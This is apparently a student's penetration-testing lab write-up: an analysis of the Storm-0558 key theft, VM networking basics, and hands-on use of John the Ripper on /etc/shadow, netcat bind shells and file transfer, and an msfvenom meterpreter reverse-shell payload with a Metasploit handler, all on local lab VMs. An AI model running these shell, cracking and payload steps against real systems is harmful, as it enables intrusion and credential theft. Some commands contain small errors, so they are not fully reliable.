# Exercise 02: Starting the Journey

## 02.a 

### 02.a.1 How did they separate access & infrastructure according to data relevance & impact?

To accomplish this, Microsoft made a distinction between two environments. On one hand, they isolated the very high impact (and data relevance) production environment, closing off collaboration tools such as email, web browsers and conference tools from external network traffic; they also took security measures like providing dedicated accounts for admin work, Just In Time + Just Enough Access models and, importantly, the policy to never allow secret keys (or whatever cryptographic material) to leave the premise.

On the other hand, the corporate environment would be provisioned with the standard collaboration tools to ensure a natural workflow; the key to securing this scene is to apply the zero trust model, meaning the workstations must be assummed as compromised because of their vulnerable nature. It was withing this high surface of impact zone that a debugging environment sat in and captured the private signing key from a crash dump due to a race condition.

Having addressed access distinctions, the separation of infrastructure is straightforward, but with a crucial flaw. Signing keys architecturally intended to separate two concerns: the consumer (MSA keys) and the enterprise (Azure AD keys). The assumption that consumer-signed tokens wouldn't be accepted in enterprise mailboxes was breached by the fact that, due to cryptographic helper libraries verified the digital signature of the private keys against public keys without validating the scope of the key, fundamentally breaking the contract.

### 02.a.2 How do roles and personnel fit into this, and which role could policies and training play?

When looking into the roles that human agents played in this event we have to first point out the one that made the attack possible, and that's the operator in the corporate environment that likely fell victim to a phishing (or perhaps social engineering) attack which resulted in the corporate debugging repository access being leaked (and captured by Storm). Besides, we have the engineers who were working in the endpoint and assummed the helper cryptographic libraries to also validate scope of the issued tokens (probably some confusion between business logic and authorization as part of the system).

As for the roles, we must first address that of the policies. Firstly, policies must explicitly classify memory crash dumps and core dumps as containing sensitive memory, inspection which Microsoft states to have enforced since then; the latter should be paired with credential scanning before any file transitions as part of ingestion policies; ideally, Just In Time + Just Enough Access should be applied to all engineers that pretend to access any relevant data, though it is true that this introduces friction; finally log retention policies should prevent cases like this one, in which definitive proof that this engineer's account was the backdoor is nowhere to be found.

Additionally, as for the training role, developers will need introduced (hands-on) to OAuth lifecycles so they can distinguish verifying signature integrity apart from checking the issuer (iss) and the audience (aud). Also, regarding safe practices around data sanitization and debugging, the operators need to recognize that race conditions often can leak secrets and personnel must treat memory snapshots as secret material rather than typical logs. Plus, anti-phishing adequation and training are a must so they can identify such attack vectors (those that have usual access to critical tools would especially benefit from such training).

### Useful links
$\rightarrow$ [MS Mitigates](https://www.microsoft.com/en-us/msrc/blog/2023/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email)
$\rightarrow$ [MS On The Issues](https://blogs.microsoft.com/on-the-issues/2023/07/11/mitigation-china-based-threat-actor/)
$\rightarrow$ [Results of Major Investigations](https://www.microsoft.com/en-us/msrc/blog/2023/09/results-of-major-technical-investigations-for-storm-0558-key-acquisition)

## 02.b 

### 02.b.1 **Networking options** 
> Write down the explanation for:
> - Network Address Translation
> - NAT Network
> - Bridged Networking
> - Host only

`Network Address Translation`: a service that allows multiple devices to access internet using the same public ID address (this type of service works at router level).

`NAT Network`: virtual network that allows virtual machines to communicate between each other and to access internet using the IP address of the hosting machine.

`Bridged networking`: by bridged networking our virtual machine will have its own IP address, as the hosting machine. Therefore the virtual machine could be accessed by all the other devices already in our host network. 

`Host only`: the virtual machine will be assigned an IP address, but it can't communicate with any other device.

### 02.b.2 **VM ip address**
> 1. Which command would you use to get the IP in Linux?
> 2. Which command would you use to the the IP in Windows? 
> 3. Inspect the whole network configuration of the Linux Metasploitable VM, i.e., interfaces, ip addresses, routes.
> 4. How does inspecting the IP coonfiguration of a system help you with penetration testing? What is the security relevant aspect?

`Which command would you use to get the IP in Linux?`
> ip a

`Which command would you use to the the IP in Windows?`
> ipconfig

`Inspect the whole network configuration of the Linux Metasploitable VM, i.e., interfaces, ip addresses, routes.`

First of all, we introduce a brief description about: interfaces, IP addresses and routes.

`Interface`: a network interface is a hardware and software tool used to translate host's internal data structure and the wire-based bit streams. 

`IP address`: an Internet Protocol address is a numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication.

`Route`: a route or a routing table contains the necessary information to forward a packet (right now we are on the third level of the stack ISO/OSI, so we don't talk anymore about frames but about packets) toward its destination.

We should write the following command to inspect both `interfaces` and `ip addresses`:
> ip address show

We will get something as follows:
```bash
vagrant@ubuntu:~$ ip address show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:42:51:79 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe42:5179/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:d7:c0:80:e0 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:d7ff:fec0:80e0/64 scope link 
       valid_lft forever preferred_lft forever
5: veth531daf1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 9a:25:76:c8:52:93 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::9825:76ff:fec8:5293/64 scope link 
       valid_lft forever preferred_lft forever
vagrant@ubuntu:~$
```

Looking at the shell the information are provided following a precise order:

1. `2:`: interface number
2. `link/ether`: MAC address
3. `eth0:`: network interface
4. `inet`: IPv4 network
5. `10.0.2.15`: ip address
6. `/24`: subnet mask (255.255.255.0)
7. `inet6`: IPv6 network
8. `fe80::a00:27ff:fe42:5179`: ip address
9. `/64`: prefix length

>Note: IPv6 doesn't use anymore a `subnet mask`, instead what is actually used is a `prefix`. A `prefix` says how many bits are used to identify the network from the host.

In order to identify `routes` we need another command, similar to the previous one:
> ip route show

We will get:
```bash
vagrant@ubuntu:~$ ip route show
default via 10.0.2.2 dev eth0 
10.0.2.0/24 dev eth0  proto kernel  scope link  src 10.0.2.15 
172.17.0.0/16 dev docker0  proto kernel  scope link  src 172.17.0.1 
vagrant@ubuntu:~$
```

Again, the information are provided in the following order:
1. `10.0.2.1`: ip address of the default gateway
2. `eth0`: network interface of the virtual machine
3. `10.0.2.0/24`: network where is the default gateway 
4. `10.0.2.15`: local ip address of the virtual machine

> Note: from this type of information we can get the local ip address of the device.

### 02.b.3 **Testing the Tools Presented in Class**

> As warm up, please got through the slides and test out commands provided. At least, look into:
> - Using `John the Ripper` to brute-force Kali's password database. Make
things more interesting by changing your password with the `passwd` command.
> - Check for open sockets with `netstat` or `ss`. Start the apache2 web server
and check again.
> - Use `nmap` on Kali to find the other virtual machines.
> Perform all examples for `netcat: 
>   - Create a listener and connect to it from another terminal window cf.
>   - Connect to a remote shell.
>   - Perform the *Basic Reverse Shell* example.
>   - Transfer a file with `netcat`.

`John the Ripper`: is an open-source password cracking tool used by system administrators to find out weak passwords. 

Its usage is very simple, we need at most three commands:
1. > passwd root
2. > unshadow /etc/passwd /etc/shadow > merged_file
3. > john --format=crypt merged_file

Before move on, we just take a look at these three commands:
1. `passwd root`: changing password of the chosen user
2. `unshadow /etc/passwd /etc/shadow > merged_file`: merging together in a single file called merged_file both contents coming from passwd and shadow files 
   1. `/etc/passwd`: passwd absolute path containing the list of all users
   2. `/etc/shadow`: shadow absolute path containing the encrypted password hashes   
3. `john --format=crypt merged_file`: trying to crack passwords contained inside the merged file
 
> Note: after the first step check whether you've really changed password. In this case, it might be useful to check if the file `shadow` has changed by `cat /etc/shadow` command.

`netstat`: displays all the open sockets, routing table and a number of network interface.

After running the command we get:
```bash
kali㉿kali$ netstat
EAM     CONNECTED     14014    
unix  3      [ ]         STREAM     CONNECTED     15441    
unix  3      [ ]         DGRAM      CONNECTED     1818     /run/systemd/notify
unix  3      [ ]         STREAM     CONNECTED     14545    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     14395    
unix  3      [ ]         STREAM     CONNECTED     10314    /run/user/1000/pipewire-0-manager
unix  2      [ ]         DGRAM      CONNECTED     9832     
unix  2      [ ]         DGRAM      CONNECTED     6603     
unix  3      [ ]         STREAM     CONNECTED     11029    /run/user/1000/at-spi/bus_0
unix  3      [ ]         STREAM     CONNECTED     6272     /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15496    /run/dbus/system_bus_socket
...

kali㉿kali$
```

As we already know, a socket is a software structure that serves as an endpoint for sending and receiving data across the network. The bash code above shows always a specific type of socket, called **Unix Domain Socket**: they are not used for the communication via Internet but just for the communication between internal processes of the virtual machine.

Therefore, in order to provide also a socket used for the communication via Internet, we should start a web server by `service apache2 start` command. After that, `netstat` will show different information than before.

Running the combination of `service apache2 start` and `netstat` we get:
```bash
kali㉿kali$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
udp        0      0 10.0.2.4:bootpc         10.0.2.3:bootps         ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     11287    
unix  3      [ ]         STREAM     CONNECTED     10489    
unix  3      [ ]         STREAM     CONNECTED     10007    
unix  3      [ ]         STREAM     CONNECTED     9214     /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     11387    /run/user/1000/bus
...

kali㉿kali$
```

Right now, we don't have anymore only software structures for the communication between internal processes, but also an **UDP** connection for the communication with an external server.

`nmap`: powerful tool for scanning whole networks.

In order to use this command, we need to specify which network we would like to explore. Before this, it might be useful to discover the IP address of the current machine and then use it by the `nmap` command for scanning all the other devices already connected in the same local network.

Therefore, we execute the following two commands:
1. `ip address show`: displaying the local IP address of the virtual machine
2. `nmap -sP ip/subnet`: displaying all the other devices already connected to the same local network

```bash
kali㉿kali$ ip address show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:bb:b0:16 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.4/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 470sec preferred_lft 470sec
    inet6 fe80::7f3c:cb9f:84c8:fa4e/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
...

kali㉿kali$
```

We take in account the IP address `10.0.2.4` with its subnet mask, and finally we run `nmap` command: we should get the list of all the devices already connected to the same local network.

```bash
kali㉿kali$ nmap -sP 10.0.2.4/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 04:35 -0400
Nmap scan report for 10.0.2.1
Host is up (0.00044s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00039s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00033s latency).
MAC Address: 08:00:27:15:DA:61 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.14 seconds

kali㉿kali$
```

`netcat`: powerful tool for creating TCP/IP connections. 

`nmap` and `netcat` are very similar, but there's a huge difference between them: `nmap` is mainly used for performing security-oriented tasks, while `netcat` provides simple and easy data trasmission and connection establishment functions.

First of all, in order to establish a communication or data trasmission we need to set up a port. That port will listen and later from another terminal we should be able to transfer a file via `netcat`.
1. `netcat -l -p 8080`: starting for listening incoming connections on port 8080
2. `nmap 127.0.0.1`: scanning the local-host to identify open ports and running services
3. `netcat 127.0.0.1 8080`: connecting to a service via port 8080 hosted by the same machine

Once the connection is established, typing a message in the second shell and pressing `Enter` will send the same message to the other end.

```bash
kali㉿kali$ netcat -lvp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 46324
```

```bash
kali㉿kali$ netcat 127.0.0.1 8080
The quick fox jump over the dog
```

```bash
kali㉿kali$ netcat -lvp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 46324
The quick fox jump over the dog
```

Via `netcat` we can also connect to a remote shell. The commands in this case are a little bit different, but they follow the same structure as before.
1. `netcat -e /bin/bash 8080`: starting for listening incoming connections on port 8080, allowing anyone with access to execute commands in the system
2. `netcat 127.0.0.1 8080`: establishing the TCP connection with the service available on port 8080

From now on we have free access to the endpoint system: we can execute any type of command we want.

```bash
kali㉿kali$ netcat -lvp 8080 -e /bin/bash
listening on [any] 8080 ...
```

```bash
kali㉿kali$ netcat 127.0.0.1 8080
whoami
```

```bash
kali㉿kali$ netcat 127.0.0.1 8080
whoami
kali
```

We can do the same thing between the Kali and Metasploitable virtual machines. The only difference is that instead of the loopback IP, we must use the Kali's local IP address.

```bash
kali㉿kali$ netcat -lvp 8080 -e /bin/bash
listening on [any] 8080 ...
```

```bash
vagrant@ubuntu$ netcat 10.0.2.4 8080
ls -l
```

```bash
vagrant@ubuntu$ netcat 10.0.2.4 8080
ls -l
total 48
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Desktop
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Documents
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Downloads
-rw-rw-r-- 1 kali kali   37 Sep  3 13:17 gvm
-rw-rw-r-- 1 kali kali    0 Sep 12 17:03 merged_file
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Music
drwxr-xr-x 2 kali kali 4096 Sep 15 10:51 Pictures
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Projects
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Public
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Templates
drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Videos
```

Another useful feature of `netcat` is the ability to transfer files between endpoints. In this case, we try to share a single file between Kali and Metasploitable virtual machines, using the first one as `sender` and the second one as `receiver`.

```bash
kali㉿kali$ netcat -lvp 8080 < test_1.txt
```

```bash
vagrant@ubuntu$ netcat 10.0.2.4 8080 > test_1.txt
```

At the end, Metasploitable virtual machine will receive `test_1.txt` sent by Kali virtual machine, saving it inside its own system.

### 02.b.4 **Simulating remote access**
> For this tutorial, we will use the metasplot framework, which provides a large
> collection of payloads (for actions to be taken) and exploits (for transmitting
> the payloads) amongst many other tools. The tutorial is about the payload, not about a hacking-process leading to the deployment of the payload. Therefore, we apply the following steps.
> 1. We create a payload, which will establish a connection to the hacking VM 
> 2. Get this payload to the target machine
> 3. Have a listener running on the attacker's machine, which will receive the connection.
> 4. Finally execute the payload from the target machine.
> 5. And then explore the abilities of metasploit's meterpreter.

`Metasplot`: framework which provides `exploits` to find out vulnerabilities of the target.

`Exploit`: modules that uses `payloads`.

`Payload`: file of code that runs remotely.

In order to provide a solution of this exercise, we need to set up a `reverse shell` architecture: the target, running the `payload` received before, will connect to the attacker's machine.

In all of the cases, the `payload` is provided by the attacker. However, we have to create this `payload` before we send it. A `payload` is defined by the following list of commands:
1. > msfconsole
1. > msfvenom
2. > -p linux/x86/meterpreter/reverse_tcp \
3. > -a x86 --platform linux f elf \
4. > LHOST=10.0.2.24 LPORT=4444 \
5. > -o payload.elf

```bash
kali㉿kali$ msfconsole
```

```bash
msf > msfvenom
```

Once all these commands have been executed, in our current directory will be created a new file called `payload.elf`, which it will be transfered to the target machine through a `netcat` TCP connection.
```bash
kali㉿kali$ netcat -lvp 8080 < payload.elf
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 46324
```

Port 8080 is listening for any incoming connection, therefore the next step is to establish a communication by the target virtual machine.

```bash
vagrant@ubuntu$ netcat 10.0.2.4 8080 > payload.elf
```

If the target machine runs this malicious executable, we can remotely access the target machine using `metasploit`, until its execution is stopped. The last step before the real execution, it's to set up a listener inside the attacker's machine: as soon as the target machine runs the `payload`, it activates and sends an outgoing call to the attacker's machine, establishing a connection between them.

In this way, by following a `reverse shell` approach, we can avoid all the restrictions defined by the firewall, since it is the target machine that establishes a connection with the attacker's machine.

```bash
kali㉿kali$ msfconsole
```

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.0.2.4
msf exploit(multi/handler) > set LPORT 8080
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.4:8080 
```

We set up a listener, `metasploit` will wait until the target machine runs the malicious executable. Once executed, the malicious `payload` will then connect to the server we just now started and it will provide us a `Meterpreter` shell, allowing us to access to the target machine system.

```bash
vagrant@ubuntu$ chmod a+x payload.elf
vagrant@ubuntu$ ./payload.elf
```

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.4:8080 
[*] Sending stage (1079144 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400

meterpreter > 
```

The connection is established, the attacker's machine can access to different information of the target machine.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.4:8080 
[*] Sending stage (1079144 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400

meterpreter > getuid 
Server username: vagrant
meterpreter > 
```

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.4:8080 
[*] Sending stage (1079144 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400

meterpreter > getuid 
Server username: vagrant
meterpreter > sysinfo
Computer     : ubuntu
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```

> Note: `Metasploit` was run on the Kali virtual machine.